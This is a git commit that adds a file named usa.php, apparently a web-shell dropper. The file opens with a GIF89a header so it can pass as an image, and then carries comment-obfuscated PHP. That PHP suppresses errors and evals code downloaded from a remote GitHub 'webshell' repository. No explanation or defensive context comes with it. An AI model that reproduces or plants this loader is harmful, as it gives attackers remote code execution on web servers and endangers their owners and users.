95e9fe61e3d02f72ba4b77035594ef5b1d52e00a
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-01-23 18:47:47 +0700

    Create usa.php

---
+++ usa.php
@@ -0,0 +1,4 @@
+GIF89a;
+<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
+
+.<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode("https://raw.githubusercontent.com/exploit-haxor/webshell/main/usa.txt"))));/**/?>
